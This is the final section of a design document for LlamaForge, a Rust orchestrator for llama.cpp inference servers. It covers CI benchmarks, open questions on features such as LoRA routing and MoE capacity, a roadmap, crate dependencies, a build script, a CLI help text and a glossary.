- Queue insert/dispatch cycle at N=100/1000/10000 requests.
- Routing score computation for 4/16/64 candidate servers.
- Starvation boost scan at N=100/500 queued requests.
- Prefix hash computation and LRU cache lookup at 1000/10000 entries.

CI fails if p95 latency regresses by >20% compared to the baseline. These benchmarks catch performance regressions from refactoring (e.g., accidentally switching from O(log K) to O(N) in the queue) that functional tests cannot detect.

### 18.8 CI Pipeline

```
cargo test                    # Unit tests (~5 seconds)
cargo test --features mock    # Integration tests with mock-llama (~30 seconds)
llamaforge validate --config test/config.toml  # Config validation
llamaforge dry-run --config test/config.toml   # Start without spawning backends
```

The `dry-run` mode starts LlamaForge's API surface (gRPC + HTTP), Web UI, and queue — but does not spawn any llama-server processes. Useful for testing configuration, API endpoints, and Web UI in CI/CD without GPUs.

---

## 19. Open Questions & Future Work

### Open Questions

1. **Model hot-swap:** Should LlamaForge support swapping the model on a running llama-server instance (requires stop → start with new model path)? Or should model changes always be new server instances?

2. **~~Multi-LoRA routing~~ (RESOLVED -- promoted to v1):** LoRA adapter routing is now a v1 feature. `lora_adapters` is defined in server config TOML, `lora_adapter` is a field in `RequestMetadata` (protobuf), adapter availability is a hard routing constraint, and `/api/servers/{id}/lora-adapters` provides runtime adapter management. Remaining open question: should LlamaForge support hot-loading new adapters (via llama-server's `/lora-adapters` POST) without server restart? Current v1 design loads adapters at server start only; runtime load/unload via the management API is a v1.1 enhancement.

3. **Speculative decoding tuning:** `speculative_method` is now exposed in server config with `speculative_acceptance_rate` and `speculation_depth` as per-request and per-server metrics. Remaining question: should LlamaForge auto-disable speculative decoding when acceptance rate drops below a threshold (indicating poor draft model fit for the workload)?

4. **Router mode (dynamic model loading):** llama-server supports a router mode (`--models-dir`) that dynamically loads and unloads models on demand without pre-specifying `--model`. The current design assumes each server has a fixed model. Supporting router mode would allow LlamaForge to manage servers where model loading is demand-driven — useful for machines with many models but limited VRAM. This requires tracking which models are currently loaded (via the llama-server `/models` endpoint), integrating with the routing algorithm, and handling model load latency as a component of TTFT. Planned for v1.2.

5. **Slot save/restore (session persistence):** llama-server supports persisting KV cache state to disk via `/slots/{id}?action=save` and `?action=restore`. LlamaForge could orchestrate cache warming across server restarts. See v1.1 Roadmap.

6. **Cost accounting:** Should per-request metrics include a computed "cost" field based on GPU-seconds consumed? Useful for internal chargeback.

7. **Feedback loop:** Should the priority system learn from historical metrics? E.g., automatically boost priority for task types that historically have tight latency SLAs.

8. **gRPC trade-off acknowledgment:** The choice of gRPC as primary API adds operational complexity (protobuf compilation, client library generation, difficulty debugging with curl/httpie) in exchange for type safety, streaming, and cross-language code generation. For teams where most traffic comes from Python OpenAI SDK clients, the majority of requests will hit the HTTP shim regardless. The current design mitigates this by keeping the `InferenceEngine` trait protocol-agnostic — the primary/secondary role can be inverted in a future revision if gRPC adoption is lower than expected. The HTTP shim is not a second-class citizen: it has full feature parity and is tested to the same standard.

9. **MoE (Mixture of Experts) capacity characteristics:** MoE models (e.g., Mixtral, DBRX, DeepSeek-V2) activate only a subset of parameters per token, giving them different memory vs. compute trade-offs compared to dense models. A 47B MoE model may use VRAM comparable to a 47B dense model but compute comparable to a 13B model. The current VRAM estimation heuristic and slot-based capacity planning do not account for this. Future work should consider MoE-aware VRAM estimation and potentially different slot concurrency defaults for MoE models (they can often support more parallel slots than a dense model of equivalent parameter count).

### v1.1 Roadmap

- **Logprobs in streaming responses:** Add `optional TokenLogprob logprob = 8` to `TokenChunk` protobuf (reusing the `TokenLogprob` message already defined for `CompletionChoice.logprobs` in v1). When `SamplingParams.logprobs = true`, each `TokenChunk` carries per-token log-probability data matching the OpenAI streaming format. The HTTP shim maps these into `choices[].logprobs` in each SSE chunk. Non-streaming logprobs are already supported in v1 via `CompletionChoice.logprobs`.
- **Multi-completion (`n > 1`):** Implement per-completion slot allocation (a request with `n=4` consumes 4 slots), multi-choice response format (`CompletionSummary.choices[]`), and per-completion metrics. The routing algorithm must account for `n` when evaluating `free_slot_ratio`.
- **Per-server routing weight profiles:** Allow configurable scoring weights per server type (e.g., speculative decoding servers have higher generation TPS but potentially higher TTFT). Replace global `WEIGHT_*` constants with per-server-type profiles so the routing algorithm can differentiate.
- **Token-budget rate limiting:** Complement the per-requestor concurrent+queued request limit (default: 50) with a token-budget rate limit (tokens per minute per requestor). This prevents a requestor from monopolizing GPU time with a smaller number of high-`max_tokens` requests.
- **Full Anthropic API parity:** Extend the `/v1/messages` shim to support prompt caching tokens, extended thinking, and batch API.
- **Slot save/restore (session persistence):** Orchestrate KV cache persistence across server restarts (see open question #5).

### Future Work (v2+)

- **Preemptive eviction (v2):** Prefill-only eviction as described in Section 9.3.
- **VRAM tracking:** Query actual free VRAM per GPU (via `nvidia-smi` or NVML bindings), track cumulative VRAM across running servers, and expose VRAM availability via the management API. Currently only `estimated_vram_mb` is supported as a static config field.
- **Auto-scaling:** Automatically start/stop llama-server instances based on queue depth and utilization thresholds.
- **Model preloading:** Predictively load models based on time-of-day request patterns.
- **A/B testing:** Route a percentage of traffic to different model versions and compare metrics.
- **Request replay:** Replay historical requests from the audit log for benchmarking new configurations.
- **SDK libraries:** Publish a Python `llamaforge` client library that wraps the extended gRPC API with type-safe metadata, plus a thin wrapper that auto-detects whether to use gRPC or HTTP.
- **Webhook notifications:** Fire webhooks on server state changes, eviction events, or metric threshold breaches.
- **Multi-node queue:** Migrate from in-process bucket queue (`MultiLevelQueue`) to Redis sorted sets for distributed scheduling.

---

## Appendix A: Crate Dependency Map

```toml
[dependencies]
# Core async runtime
tokio = { version = "1", features = ["full"] }

# gRPC (primary API)
tonic = { version = "0.13", features = ["tls", "gzip", "zstd"] }
prost = "0.13"
prost-types = "0.13"     # google.protobuf.Timestamp, Duration, etc.
tokio-stream = "0.1"     # Stream utilities for gRPC server-side streaming

# HTTP (OpenAI shim + management + Web UI)
axum = { version = "0.8", features = ["ws"] }
tower = "0.5"
tower-http = { version = "0.6", features = ["cors", "trace", "fs"] }
hyper = { version = "1", features = ["full"] }

# Serialization & Config
serde = { version = "1", features = ["derive"] }
serde_json = "1"
toml = "0.8"

# Database (behind MetricsStore / ConfigOverlayStore traits — Section 13)
rusqlite = { version = "0.32", features = ["bundled"] }
deadpool-sqlite = "0.8"     # Async connection pool wrapping rusqlite
async-trait = "0.1"         # Trait definitions for pluggable storage backends
# Optional (feature = "postgres"):
# sqlx = { version = "0.8", features = ["runtime-tokio", "postgres", "chrono", "uuid"] }

# Metrics
prometheus = "0.13"

# Logging
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["json", "env-filter"] }

# HTTP Client (for proxying to downstream llama-server, which speaks HTTP)
reqwest = { version = "0.12", features = ["json", "stream"] }

# Concurrent data structures
dashmap = "6"               # DashSet for dispatch tracking (via DashMap re-export)
ahash = "0.8"               # Fast non-crypto hasher for DashSet<RequestId> — see Section 10.2

# Utilities
uuid = { version = "1", features = ["v7", "serde"] }
chrono = { version = "0.4", features = ["serde"] }
clap = { version = "4", features = ["derive"] }
anyhow = "1"
thiserror = "2"

# Web UI
minijinja = { version = "2", features = ["builtins"] }  # Template rendering with auto-escaping for htmx partials

# Async stream utilities
async-stream = "0.3"           # Generator-based async streams — provides stream! macro for 'static Stream construction

# Lock-free config
arc-swap = "1"                 # Atomic pointer swap for lock-free config reads (SIGHUP hot-reload)

# Database migrations
rusqlite_migration = "1"       # user_version-based schema migration runner for SQLite

# Unix process management
nix = { version = "0.29", features = ["signal", "process"] }  # Unix signal/process operations for orphan recovery

# GPU telemetry
nvml-wrapper = "0.10"          # NVIDIA GPU telemetry via NVML (temperature, utilization, VRAM)
# [IR-3] All FFI calls (NVML, IOKit, rocm-smi-lib) are wrapped behind a safe
# `GpuTelemetry` trait with feature-flag-gated implementations:
#   - feature = "nvidia": NvmlTelemetry (links nvml-wrapper)
#   - feature = "metal":  MetalTelemetry (IOKit/sysctl via objc2 or core-foundation)
#   - feature = "rocm":   RocmTelemetry (FFI to librocm_smi64.so)
#   - default:            StubTelemetry (returns None for all queries)
# All `unsafe` is confined to the impl modules — the trait surface is fully safe.
# This prevents unsoundness from leaking into the orchestrator core.

# Web UI static files are embedded via include_bytes! — no Rust UI framework needed
# htmx + Alpine.js + ECharts are vendored JS/CSS files in the assets/ directory

# [IR-10] Feature flag structure for platform-specific and optional code:
[features]
default = ["nvidia"]
nvidia = ["nvml-wrapper"]           # NVML GPU telemetry (Linux/CUDA)
metal = []                          # macOS Metal via IOKit/sysctl (no extra crate)
rocm = []                           # ROCm via FFI to librocm_smi64.so
postgres = ["sqlx"]                 # PostgreSQL backend (v1.1)
web-ui = ["minijinja"]              # Web UI (can be disabled for headless deployments)

[build-dependencies]
tonic-build = "0.13"   # Compiles .proto → Rust in build.rs
prost-build = "0.13"
```

### Build Script (`build.rs`)

```rust
fn main() -> Result<(), Box<dyn std::error::Error>> {
    tonic_build::configure()
        .build_server(true)
        .build_client(true)  // Client stubs for testing and CLI tool
        .compile_protos(
            &[
                "proto/llamaforge/v1/common.proto",
                "proto/llamaforge/v1/inference.proto",
                "proto/llamaforge/v1/queue.proto",
                "proto/llamaforge/v1/server_mgmt.proto",
                "proto/llamaforge/v1/metrics.proto",
            ],
            &["proto"],
        )?;
    Ok(())
}
```

## Appendix B: CLI Interface

```
llamaforge 0.1.0
LLM inference orchestrator for llama.cpp

USAGE:
    llamaforge [OPTIONS] [COMMAND]

COMMANDS:
    serve           Start the LlamaForge server (default)
    validate        Validate configuration files without starting
    dry-run         Start API/UI/queue without spawning llama-server processes (for CI/testing)
    migrate         Run SQLite schema migrations
    status          Show status of all managed servers
    metrics         Query metrics from the command line
    export-config   Dump current live state to TOML (for version control/migration)

OPTIONS:
    -c, --config <PATH>    Config file path [default: ./llamaforge.toml]
    -v, --verbose          Increase log verbosity (repeatable)
    -q, --quiet            Suppress all output except errors
    --log-format <FMT>     Log format: json, pretty [default: pretty]
    -h, --help             Print help
    -V, --version          Print version
```

## Appendix C: Glossary

| Term | Definition |
|------|------------|
| **TTFT** | Time-to-First-Token. Latency from request dispatch to first generated token. |
| **TPS** | Tokens Per Second. Rate of token generation during the decode phase. |
| **Throughput** | Total tokens (prompt + completion) processed per unit time across all requests. |
| **Goodput** | Tokens from successfully completed requests only. Excludes evicted/failed/cancelled. |
| **Slot** | An independent inference context within a llama-server instance, with its own KV cache. |
| **Prefill** | The initial phase where the model processes all prompt tokens in a batch. |
| **Decode** | The autoregressive phase where tokens are generated one at a time. |
| **Continuous Batching** | Processing multiple sequences in a single forward pass, with sequences joining/leaving dynamically. |
| **Eviction** | Preempting a lower-priority in-flight request to free a slot for a higher-priority request. |
| **Starvation** | When a low-priority request never gets served because higher-priority requests keep arriving. |
| **KV Cache** | Per-layer key/value tensors stored for all processed tokens, enabling attention over previous context. |

---

*End of Design Document*
